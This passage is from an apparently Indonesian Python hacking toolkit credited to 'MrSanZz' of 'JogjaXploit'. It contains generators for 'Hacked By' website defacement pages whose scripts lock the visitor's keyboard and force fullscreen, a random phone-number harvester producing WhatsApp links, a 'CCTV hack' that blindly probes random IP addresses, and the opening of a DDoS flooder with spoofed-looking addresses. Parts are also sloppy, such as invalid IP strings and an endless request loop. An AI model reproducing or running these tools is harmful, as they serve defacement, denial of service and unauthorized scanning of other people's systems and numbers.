            <i>

            <script type="text/javascript">
            alert("Hacked By: {name}");
            </script>

            <meta charset="utf-8">
            <link rel="preconnect" href="https://fonts.gstatic.com">
            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
            """
            sc2 = "{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"
            sc3 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
            r = "{return"
            i = "}"
            ueh = "{"
            oke = """;!function e(t){void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)}"""
            rr = f"""["{msg}"]{oke}"""
            sc4 = f"{ueh}var n={rr}"
            sc5 = f"""
            <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{sc2}</style><script language="JavaScript">function confirmExit(){r}"are you sure ? wkwk"{i}function fs(){sc3}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){sc4})</script><audio src="https://kosred.com/a/gavwen.mp3" autoplay="true" id="lagu" loop=""></audio><video id="background-video" src="https://kosred.com/a/oanknh.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="100%" height="80%"><tbody><tr><td><center><small>We ARE <red>{team}</red></small><br><img src="{logo}" width="{width}" height="{height}" Loading="Lazy" onerror="this.style.display=&quot;none&quot;"><font size="5"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
            </div>
            </font>
            </body>
            </p>
            </span>
            """
            sc = sc1 + sc5
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                    print(success + f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        elif choice == "2":
            pass
            name = input(info + f"Attacker name : ")
            team = input(info + f"Team name : ")
            msg = input(info + f"Message : ")
            file_name = input(info + f"Save as [e.x : sanzz]: ")
            grts = input(f"Greetz : ")
            e = input(info + f"Photo / Logo [Skip for default icon]: ")
            width = input("Logo Width [Default : 300] : ")
            height = input("Logo Height [Default : 300] : ")
            if e:
                logo = e
            else:
                logs = ['https://kosred.com/a/nkgiza.jpeg']
                logo = random.choice(logs)
            sc1 = f"""
            <head>
                <title>HackedBy{name}</title>
                <table width="100%" height="90%">
            <tbody><tr><td align="center">

            <meta charset="utf-8">
            <link rel="preconnect" href="https://fonts.gstatic.com">
            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
            """
            idiot = """{font-family:Courier}img{opacity:80%}red{color:red}#background-video{height:100vh;width:100vw;object-fit:cover;position:fixed;left:0;right:0;top:0;bottom:0;z-index:-1}font{text-shadow:#000 0 0 3px;-webkit-font-smoothing:antialiased}div{animation:glitch 1s linear infinite}@keyframes glitch{2%,64%{transform:translate(2px,0) skew(0)}4%,60%{transform:translate(-2px,0) skew(0)}62%{transform:translate(0,0) skew(5deg)}}div:after,div:before{content:attr(title);position:absolute;left:0}div:before{animation:glitchTop 1s linear infinite;clip-path:polygon(0 0,100% 0,100% 33%,0 33%);-webkit-clip-path:polygon(0 0,100% 0,100% 33%,0 33%)}@keyframes glitchTop{2%,64%{transform:translate(2px,-2px)}4%,60%{transform:translate(-2px,2px)}62%{transform:translate(13px,-1px) skew(-13deg)}}div:after{animation:glitchBotom 1.5s linear infinite;clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%);-webkit-clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%)}@keyframes glitchBotom{2%,64%{transform:translate(-2px,0)}4%,60%{transform:translate(-2px,0)}62%{transform:translate(-22px,5px) skew(21deg)}}"""
            i2 = """{var e=document.documentElement;e.requestFullscreen?e.requestFullscreen():e.msRequestFullscreen?e.msRequestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen&&e.webkitRequestFullscreen(),document.getElementById("body").style.cursor="http://cur.cursors-4u.net/symbols/sym-1/sym46.cur",document.onkeydown=function(e){return!1},document.addEventListener("keydown",e=>{"F11"==e.key&&e.preventDefault()})}"""
            ess = """{return"are you sure ? wkwk"}"""
            wade = "{var n="
            jogja = """{void 0===n[t]&&setTimeout(function(){e(0)},3e4),t<n[t].length&&function e(t,n,o){n<t.length?(document.getElementById("hekerabies").innerHTML=t.substring(0,n+1),setTimeout(function(){e(t,n+1,o)},150)):"function"==typeof o&&setTimeout(o,7e3)}(n[t],0,function(){e(t+1)})}(0)})"""
            uh = f"""{ess}function fs(){i2}window.onbeforeunload=confirmExit;</script><script id="rendered-js">document.addEventListener("DOMContentLoaded",function(e){wade}["{msg}"];!function e(t){jogja}"""
            sc2 = f"""
            <body bgcolor="black" text="white" oncontextmenu="return!1" onkeydown="return!1" onmousedown="return!1" onclick="document.getElementById(&quot;lagu&quot;).play(),fs()" id="body" onload="typeWriter()" data-new-gr-c-s-check-loaded="14.1097.0" data-gr-ext-installed=""><style type="text/css">center{idiot}</style><script language="JavaScript">function confirmExit(){uh}</script>
            <video id="background-video" src="https://kosred.com/a/rkylam.mp4" autoplay="" loop="" muted="" style="position:fixed;object-fit:cover" poster="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="><source src="hehe.mp4" type="video/webm"></video><table width="{width}%" height="{height}%"><font size="5"><br>TEAM : {team}<br><img src="{logo}" style="width:300px; height:300px; border-width:0;"><br>Hacked by<red><i> {name}</i></red></font><br><font size="2" id="hekerabies">Oh No! The Security Has Been Hacked!</font><br><br><small><font size="1" color="gray">From {name}</font></small><div class="footer-greetings"><marquee><font size="2"><b>Greetz</b>: {grts}</font></marquee></div></center></td></tr></tbody></table><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body><br>
            <br>
            <audio controls src="https://kosred.com/a/jsmuvk.mp3">
            """
            sc = sc1 + sc2
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                    print(success + f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        elif choice == "3":
            pass
            name = input(info + f"Attacker name : ")
            team = input(info + f"Team name : ")
            msg = input(info + f"Message : ")
            file_name = input(info + f"Save as [e.x : sanzz]: ")
            grts = input(f"Greetz : ")
            music = input(f"Music URL : ")
            e = input(info + f"Photo / Logo [Skip for default icon]: ")
            width = input("Logo Width [Default : 300] : ")
            height = input("Logo Height [Default : 300] : ")
            logs = ['https://kosred.com/a/ukchqj.jpeg']
            rdd = random.choice(logs)
            if e:
                logo = e
            else:
                logo = rdd
            sc1 = f"""
            <head>
                <title>Hacked By {name}</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <meta charset="utf-8">
            <link rel="preconnect" href="https://fonts.gstatic.com">
            <link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
              <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
            <table width="100%" height="90%">
	          <tbody><tr><td align="center">
            <br><br>
            <br><br><font color="black">
            <i>

            <img src="{logo}" style="width:{width}px; height:{height}px; border-width:0;">
            </a><br>

            <title>Hacked By {name}</title>

            <div class="typewriter">
               <h1>Oh no! the security has been hacked!</h1>
               <h1>We Are <font color="red">{team}</font></h1>
            </div>
            </font>

            <b><br><font color="black"><font size="4">
            "{msg}" <br><br>

            <hacked>
            <br>
            <font size="3" color="red"> Greetz:</font><br>

            [<font color="red">{grts}</span> ]
            <body>
            <br><br>

            <audio autoplay="" controls src="{music}">
            </audio>

            </audio>
            </body>
            </html>

            </head>
            <body>

            <body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
            """
            sc = sc1
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                    print(success + f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        elif choice == "4":
            pass
            name = input(info + f"Attacker name : ")
            team = input(info + f"Team name : ")
            msg = input(info + f"Message : ")
            file_name = input(info + f"Save as [e.x : sanzz]: ")
            grts = input(f"Greetz : ")
            e = input(info + f"Photo / Logo [Skip for default icon]: ")
            width = input("Logo Width [Default : 300] : ")
            height = input("Logo Height [Default : 300] : ")
            logs = ['https://kosred.com/a/exvpkp.jpeg']
            rdd = random.choice(logs)
            if e:
                logo = e
            else:
                logo = rdd
            sc1 = f"""
            <html>
            <head>
                <title>Hacked By {name}</title>
            </head>
            <body bgcolor="black" >
            <center><font face="Courier new" size="24" color="lime"> We Are {team}  </font>
            <br><img src="{logo}"width="{width}"height="{height}">
            <br><h1><span style="color:#ffffff;font-family:Iceland;text-shadow:#FF0099 0px 0px 10px">[ Hacked By {name} ]</span></h1>
            <font face="Courier new" size="6" color="red"> {msg} </font>
            <br>
            <marquee behavior="scroll" direction="left" scrollamount="4" scrolldelay="55" width="100%">
            <font face="Courier New" size="5" font style="text-shadow: 0px 0px 20px blue;" color="blue">
            <b>-=| Greetz : {grts} |=-</font>
            </body>
            </html>
            """
            sc = sc1
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                    print(success + f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        elif choice == "5":
            pass
            name = input(info + f"Attacker name : ")
            team = input(info + f"Team name : ")
            msg = input(info + f"Message : ")
            file_name = input(info + f"Save as [e.x : sanzz]: ")
            grts = input(f"Greetz : ")
            e = input(info + f"Photo / Logo [Skip for default icon]: ")
            width = input("Logo Width [Default : 300] : ")
            height = input("Logo Height [Default : 300] : ")
            logs = ['https://kosred.com/a/wudeyr.jpeg']
            rdd = random.choice(logs)
            if e:
                logo = e
            else:
                logo = rdd
            style = """
            body {
                    font-family: monospace;
	                background-color: black;
	                justify-content: center;
	                text-align: center;
		            font-color: white;
                }

                .message {
                    font-color: gold;
	                font-family: monospace;
    	            font-align: center;
                }

               .in {
                    font-family: sans-serif;
	                font-color: white;
                }
            """
            sc1 = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Hacked By {name}</title>
	            <table width="100%" height="100%">
	            <tbody><tr><td align="center">
	            </head>
                <style>
                {style}
                </style>
                <body text="white">
                <p>Hacked By {name}</p><br>
                <img src="{logo}" width="{width}" height="{height}"><br><br>
                <font color="yellow" ><p class="message">MESSAGE : </p></font>
                <p class="in">{msg}</p><br><br>
                <p><font color="red" size="4">-= Greetz =-</font></p>
                <marquee>-= {grts} =-</marquee>
                <br><br><font color="gold" size="3"><p class="message">WE ARE :</p></font>
                <p>{team}</p>
            """
            sc = sc1
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                    print(success + f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        elif choice == "6":
            pass
            name = input(info + f"Attacker name : ")
            msg = input(info + f"Message : ")
            file_name = input(info + f"Save as [e.x : sanzz]: ")
            grts = input(f"Greetz : ")
            music = input(f"Music URL : ")
            e = input(info + f"Photo / Logo [Skip for default icon]: ")
            width = input("Logo Width [Default : 300] : ")
            height = input("Logo Height [Default : 300] : ")
            logs = ['https://pa1.narvii.com/5720/b5b2f3fc8e3cbd75c382b472a31c69ad4a4b3320_hq.gif']
            rdd = random.choice(logs)
            if e:
                logo = e
            else:
                logo = rdd
            st1 = """
            {display:table;height:100%;width:100%;} body{background-color:black; } body{display:table-cell;vertical-align:middle;text-align:center;} img { opacity:0.8; }
            """
            sc1 = f"""
            <!DOCTYPE html>
            <html lang="en"><head></head><body bgcolor="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">&lt;------------
            -------------- copyright {name} ------------&gt;
            <title>Hacked By {name}</title> <link href="https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet" type="text/css"> <meta content="Hacked By {name}" name="description"> <meta content="Hacked By {name}" name="keywords"> <meta content="Hacked By {name}" name="Abstract"> <meta name="title" content="Str0ng3"> <meta name="description" content=""> <meta name="keywords" content="Hacked"> <meta name="googlebot" content="index,follow"> <meta name="robots" content="all"> <meta name="robots schedule" content="auto"> <meta name="distribution" content="global"> <style type="text/css"> @import url('https://fonts.googleapis.com/css?family=Megrim'); html{st1} </style>   <center> <img src="{logo}" width="{width}" height="{height}"><br><br> <font face="Megrim" font="" color="white" size="6"><b>Hacked By {name}</b><br> </font></center> <center><font face="Shadows Into Light Two" color="#fff" size="3px">-=!!=- {msg} -=!!=-</font></center> <br> <font face="Shadows Into Light Two" color="#fff" size="3px">-= Greetz =-<br></font> <font face="Shadows Into Light Two" size="3px" color="#ff0000">=- {grts} -=<br></font>
            <audio src="{music}" loop="True" autoplay hidden></audio>
            </body></html>
            """
            sc = sc1
            target_directory = 'Deface'

            file_path = os.path.join(target_directory, file_name)

            def logging(file_path, file_name):
                try:
                    time.sleep(0.5)
                    with open(file_path + ".html", "w") as file:
                        file.write(str(sc))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                    print(success + f"Success make file {file_name}.html")
                except FileExistsError:
                    print(f"File {file_name}.html Already Exists !")

            logging(file_path, file_name)
        else:
            print("Exit . . .")
    elif answer == '14':
        pass
        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
        white = '\033[1;37m'
        red = '\033[1;91m'
        logo = f"""

        {red}██████{white}╗ {red}██{white}╗  {red}██{white}╗ {red}██████{white}╗ {red}███{white}╗   {red}██{white}╗{red}███████{white}╗    {red}██{white}╗  {red}██{white}╗{red}██{white}╗   {red}██{white}╗{red}███{white}╗   {red}██{white}╗{red}████████{white}╗{red}███████{white}╗{red}██████{white}╗ 
        {red}██{white}╔══{red}██{white}╗{red}██{white}║  {red}██{white}║{red}██{white}╔═══{red}██{white}╗{red}████{white}╗  {red}██{white}║{red}██{white}╔════╝    {red}██{white}║  {red}██{white}║{red}██{white}║   {red}██{white}║{red}████{white}╗  {red}██{white}║╚══{red}██{white}╔══╝{red}██{white}╔════╝{red}██{white}╔══{red}██{white}╗
        {red}██████{white}╔╝{red}███████{white}║{red}██{white}║   {red}██{white}║{red}██{white}╔{red}██{white}╗ {red}██{white}║{red}█████{white}╗      {red}███████{white}║{red}██{white}║   {red}██{white}║{red}██{white}╔{red}██{white}╗ {red}██{white}║   {red}██{white}║   {red}█████{white}╗  {red}██████{white}╔╝
        {red}██{white}╔═══╝ {red}██{white}╔══{red}██{white}║{red}██{white}║   {red}██{white}║{red}██{white}║╚{red}██{white}╗{red}██{white}║{red}██{white}╔══╝      {red}██{white}╔══{red}██{white}║{red}██{white}║   {red}██{white}║{red}██{white}║╚{red}██{white}╗{red}██{white}║   {red}██{white}║   {red}██{white}╔══╝  {red}██{white}╔══{red}██{white}╗
        {red}██{white}║     {red}██{white}║  {red}██{white}║╚{red}██████{white}╔╝{red}██{white}║ ╚{red}████{white}║{red}███████{white}╗    {red}██{white}║  {red}██{white}║╚{red}██████{white}╔╝{red}██{white}║ ╚{red}████{white}║   {red}██{white}║   {red}███████{white}╗{red}██{white}║  {red}██{white}║
        {white}╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                By MrSanZz
                                            Team JogjaXploit
        """
        print(logo)
        print('')
        try:
            o = int(input("HOW MANY YOU WANT TO HUNT : "))
            re = input("Phone Number Region Code [Don't Use + ] : ")
            loges = input(f"Name For Save : ")
            try:
                os.mkdir('HuntPhone')
            except FileExistsError:
                pass
        except ValueError:
            print("Did you fill correctly?, Please retry..")
            exit()
        try:
            if len(re) == 2:
                print("2 Digit Detected")
                reg = '+'+re
                for i in range(o):
                    angka = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
                    i = random.choice(angka)
                    b = random.choice(angka)
                    n = random.choice(angka)
                    m = random.choice(angka)
                    z = random.choice(angka)
                    a = random.choice(angka)
                    s = random.choice(angka)
                    d = random.choice(angka)
                    w = random.choice(angka)
                    l = random.choice(angka)
                    k = random.choice(angka)
                    N = reg+i+b+n+m+z+a+s+d+w+l+k #11
                    pN = phonenumbers.parse(N)
                    ie = phonenumbers.is_valid_number(pN)
                    wa = f'https://api.whatsapp.com/send?phone={N}'
                    target_directory = 'HuntPhone'
                    file_name = loges

                    file_path = os.path.join(target_directory, file_name)

                    def logger(file_path, file_name):
                        try:
                            with open(file_path + ".txt", "a") as file:
                                file.write(str(N))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                                file.write('\n')
                                file.write(str(wa))
                                file.write('\n')
                                file.close
                        except FileExistsError:
                            print(f"File {file_name}.txt Already Exists !")
                            exit()
                    
                    if ie:
                        print('Valid: ', N, end='\r')
                        logger(file_path, file_name)
                    else: 
                        print('Valid:  No             ', end='\r')
                print("Done Hunting..         ")
            elif len(re) == 3:
                print("3 Digit Detected")
                reg = '+'+re
                for i in range(o):
                    angka = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
                    i = random.choice(angka)
                    b = random.choice(angka)
                    n = random.choice(angka)
                    m = random.choice(angka)
                    z = random.choice(angka)
                    a = random.choice(angka)
                    s = random.choice(angka)
                    d = random.choice(angka)
                    w = random.choice(angka)
                    N = reg+i+b+n+m+z+a+s+d+w #9
                    pN = phonenumbers.parse(N)
                    ie = phonenumbers.is_valid_number(pN)
                    wa = f'https://api.whatsapp.com/send?phone={N}'
                    target_directory = 'HuntPhone'
                    file_name = loges

                    file_path = os.path.join(target_directory, file_name)

                    def logger(file_path, file_name):
                        try:
                            with open(file_path + ".txt", "a") as file:
                                file.write(str(N))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                                file.write('\n')
                                file.write(str(wa))
                                file.write('\n')
                                file.close
                        except FileExistsError:
                            print(f"File {file_name}.txt Already Exists !")
                            exit()
                    
                    if ie:
                        print('Valid: ', N, end='\r')
                        logger(file_path, file_name)
                    else: 
                        print('Valid:  No             ', end='\r')
                print("Done Hunting..         ")
            elif len(re) < 2:
                print("1 Digit Detected")
                reg = '+'+re
                for i in range(o):
                    angka = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
                    i = random.choice(angka)
                    b = random.choice(angka)
                    n = random.choice(angka)
                    m = random.choice(angka)
                    z = random.choice(angka)
                    a = random.choice(angka)
                    s = random.choice(angka)
                    d = random.choice(angka)
                    w = random.choice(angka)
                    x = random.choice(angka)
                    N = reg+i+b+n+m+z+a+s+d+w+x #10
                    pN = phonenumbers.parse(N)
                    ie = phonenumbers.is_valid_number(pN)
                    wa = f'https://api.whatsapp.com/send?phone={N}'
                    target_directory = 'HuntPhone'
                    file_name = loges

                    file_path = os.path.join(target_directory, file_name)

                    def logger(file_path, file_name):
                        try:
                            with open(file_path + ".txt", "a") as file:
                                file.write(str(N))  # Pastikan bahwa variabel 'sc' sudah didefinisikan sebelumnya
                                file.write('\n')
                                file.write(str(wa))
                                file.write('\n')
                                file.close
                        except FileExistsError:
                            print(f"File {file_name}.txt Already Exists !")
                            exit()
                    
                    if ie:
                        print('Valid: ', N, end='\r')
                        logger(file_path, file_name)
                    else: 
                        print('Valid:  No             ', end='\r')
                print("Done Hunting..         ")
        except PermissionError:
            print("Don't open the file/folder if it is processing!!")
            print("E: PermissionError")
        except KeyboardInterrupt:
            print("Exit..")
            exit()
    elif answer == '15':
        pass
        if os.name == 'posix':
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
        print("Your OS : ", os.name)
        num = int(input("Total CCTV You Want To Hack : "))
        print('Please Wait !!')
        for i in range(num):
            try:
                angka = ['1', '2', '3', '4', '5', '6', '7', '8', '9','0']
                #5
                n1 = random.choice(angka)
                n2 = random.choice(angka)
                n3 = random.choice(angka)
                n4 = random.choice(angka)
                n5 = random.choice(angka)
                #6
                a1 = random.choice(angka)
                a2 = random.choice(angka)
                a3 = random.choice(angka)
                a4 = random.choice(angka)
                a5 = random.choice(angka)
                a6 = random.choice(angka)
                a7 = random.choice(angka)
                a8 = random.choice(angka)
                #7
                b1 = random.choice(angka)
                b2 = random.choice(angka)
                b3 = random.choice(angka)
                b4 = random.choice(angka)
                b5 = random.choice(angka)
                b6 = random.choice(angka)
                b7 = random.choice(angka)
                b8 = random.choice(angka)
                b9 = random.choice(angka)
                port = ['8080', '443', '1225', '80', '5050', '55', '6656' ,'3242', '134', '1334', '1676', '9090', '2555', '2525', '5255']
                p = random.choice(port)
                p2 = random.choice(port)
                p3 = random.choice(port)
                seg5 = f'https://1{n1}{n2}.{n1}{n2}{n3}.{n4}.{n5}:{p}'
                seg6 = f'https://1{a1}{a2}.{a3}{a4}{a5}.{a6}{a7}.{a8}:{p2}'
                seg7 = f'https://1{b1}{b2}.{b3}{b4}{b5}.{b6}{b7}.{b8}{b9}:{p3}'
                print("Trying", seg5, seg6, seg7)
                while True:
                    response1 = requests.get(seg5)
                    response2 = requests.get(seg6)
                    response3 = requests.get(seg7)
                    if response1.status_code == 200:
                        print(seg5)
                        print("[ + ] Code 200, Maybe is valid cctv [ + ]")
                    elif response2.status_code == 200:
                        print(seg6)
                        print("[ + ] Code 200, Maybe is valid cctv [ + ]")
                    elif response3.status_code == 200:
                        print(seg7)
                        print("[ + ] Code 200, Maybe is valid cctv [ + ]")
                    else:
                        print("No response from target..")
            except:
                print("Ups, Something just kick out")
                continue
    elif answer == '16':
        try:
            import socket
            import threading
            import os
            import sys
            import colorama
            import cloudscraper
            import random
            from colorama import Fore, Back, Style, init
            init(convert=True)
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
    
            fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
            global ua
            ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
            print(Fore.LIGHTWHITE_EX + "╔════════════════════════════════════════════════════════════════════════╗")
            print("║                             "+Fore.LIGHTWHITE_EX+"╦ ╦┌─┐┌─┐┬─┐┌┬┐"+Fore.LIGHTCYAN_EX+"                            ║")
            print("║                             "+Fore.LIGHTWHITE_EX+"╠"+Fore.LIGHTCYAN_EX+"═╣├┤ ├─┤├┬┘ │"+Fore.LIGHTCYAN_EX+"                             ║")
            print("║                             "+Fore.LIGHTCYAN_EX+"╩ ╩└─┘┴ ┴┴└─ ┴"+Fore.LIGHTCYAN_EX+"                             ║")
            print("╠═══════════════════>"+Fore.LIGHTWHITE_EX+"Welcome to the main page heart <3"+Fore.LIGHTCYAN_EX+"<══════════════════╣")
            print("║                          "+Fore.LIGHTRED_EX+"  MADE IN INDONESIA"+Fore.LIGHTCYAN_EX+"                           ║")
            print("║                          "+Fore.LIGHTWHITE_EX+"     ABOUT THIS :"+Fore.LIGHTCYAN_EX+"                             ║")
            print("║                "+Fore.LIGHTWHITE_EX+"    This tool was created by MrSanZz                    ║")
            print("║            "+Fore.LIGHTWHITE_EX+" inspired by Karma DDOS, supported by JogjaXploit"+Fore.LIGHTCYAN_EX+"           ║")
            print("║                      "+Fore.LIGHTWHITE_EX+" TELEGRAM : t.me/MrSanZzXe"+Fore.LIGHTCYAN_EX+"                        ║")
            print("║                           "+Fore.LIGHTWHITE_EX+" Your Heart Ddosed!"+Fore.LIGHTCYAN_EX+"                          ║")
            print("║                          "+Fore.LIGHTWHITE_EX+" We Are : JogjaXploit"+Fore.LIGHTCYAN_EX+"                         ║")
            print("╚══════════════════════════════════════════════════════════"+Fore.LIGHTWHITE_EX+"══════════════╝")
            print('')
    
            ip = input(f"IP Target : ")
            port = int(input("Port : "))
            bps = int(input("Byte Per Sec : "))
            thrd = int(input("Threads : "))
            boost = input("Use Boost ? Y/N : ")
            if boost == 'n':
                bps = bps
            elif boost == 'y':
                bps = bps + 1000
            else:
                print("Skipped")
                bps = bps
                pass
            attack = int(0)
            def c2_special():
                count = int(0)
                ang = ['1','2','3','4','5','6','7','8','9','0']
                #7
                n1 = random.choice(ang)
                n2 = random.choice(ang)
                n3 = random.choice(ang)
                n4 = random.choice(ang)
